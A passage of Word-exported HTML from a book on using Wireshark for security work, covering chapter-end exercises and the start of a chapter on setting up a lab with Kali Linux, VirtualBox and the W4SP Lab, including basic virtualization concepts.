style="margin-top:9.1000pt;margin-right:15.1000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l10 level1 lfo1;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Consider existing network issues you might have where</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark might be helpful. (Knowing these issues might be useful in later chapters.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l10 level1 lfo1;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Write down a few filter examples to help in the case of exercise</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >#1.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section40" ><p class=17  align=justify  style="margin-top:3.7500pt;margin-right:38.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:justify;text-justify:inter-ideograph;mso-list:l10 level1 lfo1;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Design a display filter that will help you see DHCP request and response traffic for when another machine first connects to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section41" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="_bookmark55" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="Chapter 2: Setting Up the Lab" ></a><a name="_bookmark56" ></a>Chapter 2</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:0.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >Setting Up the Lab</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:15.5500pt;margin-right:9.2000pt;" ><a name="_bookmark57" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first chapter was all book learning. This chapter is different&#8212;you start to get your hands dirty. You want to start analyzing actual network traffic. Of course, to get the required network traffic, you</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >need multiple systems. You could install Wireshark on a local system and capture just any traffic, but this chapter prepares something far better. You create a lab on which you can apply Wireshark to many interesting protocols and scenarios. All this setup will benefit you, not just for the rest of the book, but also for many captures to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >follow.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:8.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You&#8217;re familiar with Wireshark&#8217;s layout, and you understand how easily filters sift through a million packets to present just what you want. So we need to create an environment meant for experiments</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and learning. The environment you set up in this chapter takes care of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >your needs in a few different forms. Thankfully, you don&#8217;t need to buy or put together several systems to do so. (Or maybe just your spouse thanks</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >us.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because this book is focused on information security, we also spend time with the Metasploit framework and Kali Linux. The Kali Linux distribution is a suite of tools, including Metasploit, that every information security professional should be aware of, if not already experienced with. In this chapter, we introduce Kali Linux, less for its tools and more as the lab platform.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These tools are open source and should be a part of any security professional&#8217;s toolkit. The number of tools included in Kali Linux in particular is such that no <a name="_bookmark58" ></a>one could actually master all of them. Like the different disciplines of information security, there are similar categories of tools in Kali, such as reconnaissance, information gathering, penetration testing, wireless tools, and so on. In this chapter, we take a high-level look at these categories and specific tools before making use of them in detail in the labs to come.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section42" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:21.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While everyone learns differently, there is no doubt that getting hands-on practice is the best way to reinforce a skill. To this end, we wanted to provide ample opportunities for hands-on practice. In addition to the exercises, we developed a lab environment, called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >W4SP Lab</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab will run as a container within your Kali Linux virtual machine (VM). We might assume some users are familiar with or already use Kali Linux, but experience with Kali Linux is not required to use the W4SP Lab. However, it is highly recommended that you use Kali Linux to follow along with the lab, exercises, and the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For the question of which desktop to work with throughout the book, we chose a Windows desktop, namely Windows 10. Although Windows 7 and Windows 8.x may still be widely used, Windows 10 is fast becoming the most popular Windows desktop version, if it isn&#8217;t already. We appreciate there are plenty of operating systems used by security professionals, and the main tools we use are cross-platform.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Therefore, the vast majority of desktop and server platforms are covered with the tools and labs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To ensure the lab is independent of people&#8217;s choices of desktop operating system, the lab runs from within a VM of Kali Linux. While the base or host operating system is Windows 10, the lab environment runs within a Kali Linux VM, and the bulk of the hands-on exercises are the same, regardless of which operating system you use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, if you are relatively familiar with virtualization and already</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >use VirtualBox, feel free to skip to the Kali VM installation. If you happen to already have a Kali VM with Kali Linux installed (not LIVE), feel free to skip to the W4SP Lab section, though it might be best to review the section regarding installing and setting up the virtual lab environment so that you can follow along with the exercises throughout the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Kali Linux" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark59" ></a>Kali Linux</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Back to Kali Linux: Kali is an excellent resource for both security neophytes and seasoned professionals. It comes preinstalled with</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section43" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >numerous security tools and frameworks, and makes it easy to hit the ground running when performing just about any security-related task, from wireless hacking to forensic analysis. Oftentimes, getting certain security tools installed is a pain if it depends on other <a name="_bookmark60" ></a>software components. Kali helps to alleviate these issues by making sure these tools can be easily installed in Kali. It is important to keep in mind, however, that, like with anything built by humans, it is not always perfect, and you may find yourself wrestling with getting a certain tool installed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As mentioned, we recommend using the Kali Linux distribution as you follow along with this book. If you work in security, you are probably already familiar with the excellent work the OffSec Security guys do in putting together the Kali Linux distribution. For those who are not familiar with Kali, it is a security-themed Linux distribution. For those who are not even familiar with Linux, it is the open-source alternative operating system that practically powers the Internet; in fact, the majority of websites are running on Linux. Without going into too much of a history lesson, Linux was initially released by Linus Torvald in 1991 and has been under active development since then.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The operating systems that people use are often the result of a long- waged religious-like war. The quickest way to start a flame war is to sing praises of a specific text editor (Vim FTW!) or to bring up other operating systems or distributions. Personally, I have a very practical view regarding this. The answer to which operating system you should use generally comes down to the one with which you are most</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >familiar. All the capabilities, bells, and whistles of an operating system don&#8217;t mean much if you can&#8217;t effectively leverage them for the task at hand. That being said, there are definitely advantages and disadvantages to varying operating systems. For example, there is no comparison between the networking capabilities of Linux when compared to Windows. Windows is designed for ease of use and reliability when it comes to networking. On the other hand, Linux is geared for maximum flexibility, so much so that many advanced firewalls are actually running Linux. Linux is also open-source, which helps to foster and lower the entry level for development. As a result, security tools are often written for Linux first before being ported to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Windows.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section44" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because of this, it is important to make sure you are familiar with Linux if you are involved in the security industry. Now I realize that Windows and Linux are not the only operating systems out there.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are BSD-based operating systems such as OpenBSD and Mac OSX, which also have their own advantages and disadvantages. I suggest you spend some time installing and trying out varying operating systems to get an idea of what they offer.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="293"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker67004.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><a name="_bookmark61" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Kali recommends at least 10 GB disk size, but we recommend at least a 20 GB file to make sure you have enough room for the virtual lab environment you are going to build later.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This brings us to another nice thing about Kali Linux: the community that has been built up around it. Finding answers to issues in Kali is often as simple as a Google search or swinging by the Kali forums or IRC channel. (Check out the note for links and further information.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="Virtualization" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark62" ></a>Virtualization</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Installing an operating system used to mean that you used a dedicated physical computer to run that operating system. One set of hardware resources would become one, and only one, server. All resources would be allotted for that one operating system and its applications.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This all changed with the advent of virtualization technology.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Virtualization allows you to run multiple operating systems on the same computer. Using virtualization, hardware and resources normally available to one operating system are now shared among</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section45" ><p class=MsoBodyText  style="margin-top:3.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >other installed systems. The installed systems function independently from one another. Any one of the virtual operating systems knows no different from the operating system actually using the physical resources. In reality, each virtual operating system is running alongside the operating system, akin to an application running on it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Before we go further, it should be clear: virtualization can take many forms. The one type we focus on here is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >server virtualization</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, meaning you can run multiple servers or systems on one actual hardware system. There is also </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >storage virtualization</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, where storage capacity appears as one resource but the actual disk drives are likely spread across multiple physical storage systems. And there is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >network virtualization</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, where very different virtual networks with networked services are running &#8220;together&#8221; on the single physical medium, but each can appear independent. There are other types in addition to these, but they all seem to say the same: don&#8217;t let the physical aspect of hardware limit who can use it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:8.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Ultimately, virtualization is a feature provided by the CPU. Years ago, the ability to run VMs was limited to CPUs found in enterprise servers, in the data center. Up to a few years ago, if consumers wanted to run VMs on their desktops, they would need to verify their CPU choice could support the feature before buying it. Today virtualization support is widely available. Support is likely with any semi-recent chipset, released by just about any CPU manufacturer. So unless your desktop is several years old, you should be fine running any of the solutions presented in this chapter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Virtualization is here to stay. It has moved steadily for more than 15 years from being the exception to now being the norm in data centers. Virtualization <a name="_bookmark63" ></a>is implemented in many forms: for example, the operating system platform, the network, or storage. And in more recent years, the hottest byproduct to come from virtualization has been cloud computing. Services offered from the cloud are possible because of virtualized resources. Entire books have been written on virtualization. To sum up, virtualization is not new, nor is it going away any time soon, and for the sake of honing your Wireshark skills, virtualization will serve you here well.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section46" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Basic Terminology and Concepts</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When talking about virtualization, we need to define a few terms. The </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >hypervisor </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is the software responsible for leveraging the virtualization features of the specific chipset in use. The </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >host </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is the operating environment on which the hypervisor is running. In your case, this would be whatever operating system you currently have installed on the physical machine. The term </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >guest </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is generally used to refer to the virtualized operating system. So, when we say hypervisor or host, we are talking about the underlying physical machine, and when we say guest, we are talking about the VM.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When it comes to using and managing VMs, like with operating systems, there are plenty of choices. Three main virtualization solutions are available, and they can vary depending on whether it is an enterprise solution or designed for personal or desktop use. We are strictly interested in the personal or desktop virtualization solutions where KVM, VirtualBox, and VMware are the major players. Both KVM and VirtualBox are open-source solutions, while VMware is a commercial offering. It used to be that VMware was the market leader in functionality, but that has changed. Generally speaking, all three</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are equal in terms of features and functionality. For this book, we recommend using VirtualBox. It is free, cross-platform, and has an easy-to-use graphical interface. If you already happen to be familiar with another virtualization solution, feel free to use</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Benefits of Virtualization</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As previously mentioned, there is more than enough material out there to answer the question: why virtualize? We won&#8217;t bother regurgitating the generalized benefits. For here, let&#8217;s stay brief and focus on why security professionals like yourself want to virtualize.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sandboxes Can Get Dirty</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Security professionals know better than anyone else about the risks of being online, both for us and the systems we protect. They know well the consequences that can happen, no matter how carefully they work. By the nature of their <a name="_bookmark64" ></a>work, they work with questionable conditions.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section47" ><p class=MsoBodyText  style="margin-top:3.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Your job title doesn&#8217;t need to be malware analyst to discover you have malware on your system. Sometimes we experiment with a certain tool, open the wrong attachment, click on the wrong link during research&#8212;suddenly, our machine is rendered suspect at best. This is a great selling point for VMs, which when rendered suspect can, just as quickly, be rolled back to a state before that action.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Resources and System Scale Quickly</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Ever notice how we treat resources between virtual systems and bare metal systems? You appreciate VMs consume resources like any other system&#8212;that is, any system, either virtual or bare metal, needs storage, memory, and processing power. But the reasoning behind how we install or allocate resources is the key differentiator.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="position:absolute;z-index:-1;margin-left:133.0833px;margin-top:65.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker73131.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When building a bare metal server, normally resources are bound by: How much we can afford</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:6.3500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker73223.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The limits of the hardware; for example, the motherboard supports a maximum amount of memory</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="position:absolute;z-index:-1;margin-left:133.0833px;margin-top:64.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker73317.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When we build a virtual server, we allocate resources according to: What today&#8217;s intended use will be, not next year&#8217;s</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.1667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker73437.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >How many other VMs we might need up at the same time</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span 